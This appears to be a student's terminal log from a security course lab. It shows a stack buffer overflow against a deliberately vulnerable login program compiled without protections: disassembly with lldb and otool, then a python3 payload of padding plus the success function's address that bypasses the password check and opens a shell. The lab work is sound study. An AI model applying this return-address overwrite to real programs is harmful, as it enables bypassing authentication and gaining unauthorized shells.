@@ -1,0 +1,225 @@
+Last login: Wed Mar 29 23:38:00 on ttys000
+laurazhang@Lauras-MacBook-Pro ~ % cd myLocalGithubRepo/CS6014/Assignment6
+laurazhang@Lauras-MacBook-Pro Assignment6 % ./login 
+enter your password:
+successful login!
+
+sh-3.2$ 
+sh-3.2$ exit
+laurazhang@Lauras-MacBook-Pro Assignment6 % clang --target=macos-x86_64 -g -O0 -fno-stack-protector -fomit-frame-pointer -Wl,-no_pie login.c
+login.c:11:14: warning: passing 'const char *const[2]' to parameter of type 'char *const *' discards qualifiers in nested pointer types [-Wincompatible-pointer-types-discards-qualifiers]
+  execve(sh, argv, environ);
+             ^~~~
+/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/unistd.h:445:49: note: passing argument to parameter '__argv' here
+int      execve(const char * __file, char * const * __argv, char * const * __envp) __WATCHOS_PROHIBITED __TVOS_PROHIBITED;
+                                                    ^
+1 warning generated.
+ld: warning: -no_pie is deprecated when targeting new OS versions
+laurazhang@Lauras-MacBook-Pro Assignment6 % rm password.txt
+laurazhang@Lauras-MacBook-Pro Assignment6 % python3 -c 'import sys; sys.stdout.buffer.write(b"a"* + b"\xdb")' > password.txt
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+TypeError: bad operand type for unary +: 'bytes'
+laurazhang@Lauras-MacBook-Pro Assignment6 % clang --target=macos-x86_64 -g -O0 -fno-stack-protector -fomit-frame-pointer -Wl,-no_pie login.c
+login.c:11:14: warning: passing 'const char *const[2]' to parameter of type 'char *const *' discards qualifiers in nested pointer types [-Wincompatible-pointer-types-discards-qualifiers]
+  execve(sh, argv, environ);
+             ^~~~
+/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/unistd.h:445:49: note: passing argument to parameter '__argv' here
+int      execve(const char * __file, char * const * __argv, char * const * __envp) __WATCHOS_PROHIBITED __TVOS_PROHIBITED;
+                                                    ^
+1 warning generated.
+ld: warning: -no_pie is deprecated when targeting new OS versions
+laurazhang@Lauras-MacBook-Pro Assignment6 % ./a.out
+enter your password:
+successful login!
+
+sh-3.2$ $lldb <program to run>
+sh: syntax error near unexpected token `newline'
+sh-3.2$ lldb 
+sh-3.2$ exit
+laurazhang@Lauras-MacBook-Pro Assignment6 % clang --target=macos-x86_64 -g -O0 -fno-stack-protector -fomit-frame-pointer -Wl,-no_pie login.c
+login.c:11:14: warning: passing 'const char *const[2]' to parameter of type 'char *const *' discards qualifiers in nested pointer types [-Wincompatible-pointer-types-discards-qualifiers]
+  execve(sh, argv, environ);
+             ^~~~
+/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/unistd.h:445:49: note: passing argument to parameter '__argv' here
+int      execve(const char * __file, char * const * __argv, char * const * __envp) __WATCHOS_PROHIBITED __TVOS_PROHIBITED;
+                                                    ^
+1 warning generated.
+ld: warning: -no_pie is deprecated when targeting new OS versions
+laurazhang@Lauras-MacBook-Pro Assignment6 % lldb ./a.out
+(lldb) target create "./a.out"
+Current executable set to '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64).
+(lldb) disassemble -n main
+a.out`main:
+a.out[0x100003ec0] <+0>:  pushq  %rax
+a.out[0x100003ec1] <+1>:  movl   $0x0, 0x4(%rsp)
+a.out[0x100003ec9] <+9>:  callq  0x100003e50               ; login at login.c:19
+a.out[0x100003ece] <+14>: movl   %eax, (%rsp)
+a.out[0x100003ed1] <+17>: cmpl   $0x0, (%rsp)
+a.out[0x100003ed5] <+21>: je     0x100003ee5               ; <+37> at login.c:34:2
+a.out[0x100003edb] <+27>: callq  0x100003df0               ; success at login.c:8
+a.out[0x100003ee0] <+32>: jmp    0x100003eea               ; <+42> at login.c:37:3
+a.out[0x100003ee5] <+37>: callq  0x100003e40               ; failure at login.c:14
+a.out[0x100003eea] <+42>: leaq   0x8d(%rip), %rdi          ; "exiting in main\n"
+a.out[0x100003ef1] <+49>: callq  0x100003f18               ; symbol stub for: puts
+a.out[0x100003ef6] <+54>: xorl   %eax, %eax
+a.out[0x100003ef8] <+56>: popq   %rcx
+a.out[0x100003ef9] <+57>: retq   
+(lldb) p(lldb) python3 -c  'import sys; sys.stdout.buffer.w^C
+(lldb) ^D
+laurazhang@Lauras-MacBook-Pro Assignment6 % python3 -c  'import sys; sys.stdout.buffer.write(b"a"*10 + b"\xdb\x3e\x00\x00")' > password.txt
+laurazhang@Lauras-MacBook-Pro Assignment6 % ./a.out
+enter your password:
+wrong password
+
+exiting in main
+
+laurazhang@Lauras-MacBook-Pro Assignment6 % lldb ./a.out     
+(lldb) target create "./a.out"
+Current executable set to '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64).
+(lldb) process launch
+Process 37855 launched: '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64)
+warning: libobjc.A.dylib is being read from process memory. This indicates that LLDB could not read from the host's in-memory shared cache. This will likely reduce debugging performance.
+
+enter your password:
+wrong password
+
+exiting in main
+
+Process 37855 exited with status = 0 (0x00000000) 
+(lldb) otool -tVv -p _success ./a.out
+error: 'otool' is not a valid command.
+(lldb) ^D
+laurazhang@Lauras-MacBook-Pro Assignment6 % otool -tVv -p _success ./a.out
+./a.out:
+(__TEXT,__text) section
+_success:
+0000000100003df0	subq	$0x18, %rsp
+0000000100003df4	movq	_sh(%rip), %rax
+0000000100003dfb	movq	%rax, (%rsp)
+0000000100003dff	movq	$0x0, 0x8(%rsp)
+0000000100003e08	leaq	0x115(%rip), %rdi               ## literal pool for: "successful login!\n"
+0000000100003e0f	callq	0x100003f18                     ## symbol stub for: _puts
+0000000100003e14	movq	_sh(%rip), %rdi
+0000000100003e1b	movq	%rsp, %rsi
+0000000100003e1e	movq	0x1e3(%rip), %rax               ## literal pool symbol address: _environ
+0000000100003e25	movq	(%rax), %rdx
+0000000100003e28	callq	0x100003f00                     ## symbol stub for: _execve
+0000000100003e2d	addq	$0x18, %rsp
+0000000100003e31	retq
+0000000100003e32	nopw	%cs:(%rax,%rax)
+0000000100003e3c	nopl	(%rax)
+_failure:
+0000000100003e40	pushq	%rax
+0000000100003e41	leaq	0xef(%rip), %rdi                ## literal pool for: "wrong password\n"
+0000000100003e48	callq	0x100003f18                     ## symbol stub for: _puts
+0000000100003e4d	popq	%rax
+0000000100003e4e	retq
+0000000100003e4f	nop
+_login:
+0000000100003e50	subq	$0x38, %rsp
+0000000100003e54	leaq	0xec(%rip), %rdi                ## literal pool for: "password.txt"
+0000000100003e5b	xorl	%esi, %esi
+0000000100003e5d	movb	$0x0, %al
+0000000100003e5f	callq	0x100003f0c                     ## symbol stub for: _open
+0000000100003e64	movl	%eax, 0xc(%rsp)
+0000000100003e68	leaq	0xe5(%rip), %rdi                ## literal pool for: "enter your password:\n"
+0000000100003e6f	movb	$0x0, %al
+0000000100003e71	callq	0x100003f12                     ## symbol stub for: _printf
+0000000100003e76	movl	0xc(%rsp), %edi
+0000000100003e7a	leaq	0x10(%rsp), %rsi
+0000000100003e7f	movl	$0x3e8, %edx                    ## imm = 0x3E8
+0000000100003e84	callq	0x100003f1e                     ## symbol stub for: _read
+0000000100003e89	movl	%eax, 0x8(%rsp)
+0000000100003e8d	movl	0xc(%rsp), %edi
+0000000100003e91	callq	0x100003efa                     ## symbol stub for: _close
+0000000100003e96	leaq	0x10(%rsp), %rdi
+0000000100003e9b	movslq	0x8(%rsp), %rdx
+0000000100003ea0	leaq	0xc3(%rip), %rsi                ## literal pool for: "superSecretPassword"
+0000000100003ea7	callq	0x100003f06                     ## symbol stub for: _memcmp
+0000000100003eac	cmpl	$0x0, %eax
+0000000100003eaf	sete	%al
+0000000100003eb2	andb	$0x1, %al
+0000000100003eb4	movzbl	%al, %eax
+0000000100003eb7	addq	$0x38, %rsp
+0000000100003ebb	retq
+0000000100003ebc	nopl	(%rax)
+_main:
+0000000100003ec0	pushq	%rax
+0000000100003ec1	movl	$0x0, 0x4(%rsp)
+0000000100003ec9	callq	_login
+0000000100003ece	movl	%eax, (%rsp)
+0000000100003ed1	cmpl	$0x0, (%rsp)
+0000000100003ed5	je	0x100003ee5
+0000000100003edb	callq	_success
+0000000100003ee0	jmp	0x100003eea
+0000000100003ee5	callq	_failure
+0000000100003eea	leaq	0x8d(%rip), %rdi                ## literal pool for: "exiting in main\n"
+0000000100003ef1	callq	0x100003f18                     ## symbol stub for: _puts
+0000000100003ef6	xorl	%eax, %eax
+0000000100003ef8	popq	%rcx
+0000000100003ef9	retq
+laurazhang@Lauras-MacBook-Pro Assignment6 % lldb ./a.out                  
+(lldb) target create "./a.out"
+Current executable set to '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64).
+(lldb) process launch
+Process 37873 launched: '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64)
+warning: libobjc.A.dylib is being read from process memory. This indicates that LLDB could not read from the host's in-memory shared cache. This will likely reduce debugging performance.
+
+enter your password:
+wrong password
+
+exiting in main
+
+Process 37873 exited with status = 0 (0x00000000) 
+(lldb) ^D
+laurazhang@Lauras-MacBook-Pro Assignment6 % python3 -c  'import sys; sys.stdout.buffer.write(b"a"*10 + b"\xdb\x3e\x00\x00")' > password.txt
+laurazhang@Lauras-MacBook-Pro Assignment6 % lldb ./a.out
+(lldb) target create "./a.out"
+Current executable set to '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64).
+(lldb) process launch
+Process 37881 launched: '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64)
+warning: libobjc.A.dylib is being read from process memory. This indicates that LLDB could not read from the host's in-memory shared cache. This will likely reduce debugging performance.
+
+enter your password:
+wrong password
+
+exiting in main
+
+Process 37881 exited with status = 0 (0x00000000) 
+(lldb) disassemble -n main
+a.out`main:
+0x100003ec0 <+0>:  pushq  %rax
+0x100003ec1 <+1>:  movl   $0x0, 0x4(%rsp)
+0x100003ec9 <+9>:  callq  0x100003e50               ; login at login.c:19
+0x100003ece <+14>: movl   %eax, (%rsp)
+0x100003ed1 <+17>: cmpl   $0x0, (%rsp)
+0x100003ed5 <+21>: je     0x100003ee5               ; <+37> at login.c:34:2
+0x100003edb <+27>: callq  0x100003df0               ; success at login.c:8
+0x100003ee0 <+32>: jmp    0x100003eea               ; <+42> at login.c:37:3
+0x100003ee5 <+37>: callq  0x100003e40               ; failure at login.c:14
+0x100003eea <+42>: leaq   0x8d(%rip), %rdi          ; "exiting in main\n"
+0x100003ef1 <+49>: callq  0x100003f18               ; symbol stub for: puts
+0x100003ef6 <+54>: xorl   %eax, %eax
+0x100003ef8 <+56>: popq   %rcx
+0x100003ef9 <+57>: retq   
+(lldb) ^D
+laurazhang@Lauras-MacBook-Pro Assignment6 % python3 -c  'import sys; sys.stdout.buffer.write(b"a"*40 + b"\xdb\x3e\x00\x00")' > password.txt
+laurazhang@Lauras-MacBook-Pro Assignment6 % lldb ./a.out
+(lldb) target create "./a.out"
+Current executable set to '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64).
+(lldb) process launch
+Process 37893 launched: '/Users/laurazhang/myLocalGithubRepo/CS6014/Assignment6/a.out' (x86_64)
+warning: libobjc.A.dylib is being read from process memory. This indicates that LLDB could not read from the host's in-memory shared cache. This will likely reduce debugging performance.
+
+enter your password:
+successful login!
+
+Process 37893 exited with status = 5 (0x00000005) Terminated due to signal 5
+(lldb) ^D
+laurazhang@Lauras-MacBook-Pro Assignment6 % ./a.out     
+enter your password:
+successful login!
+
+sh-3.2$ exit
+laurazhang@Lauras-MacBook-Pro Assignment6 % 
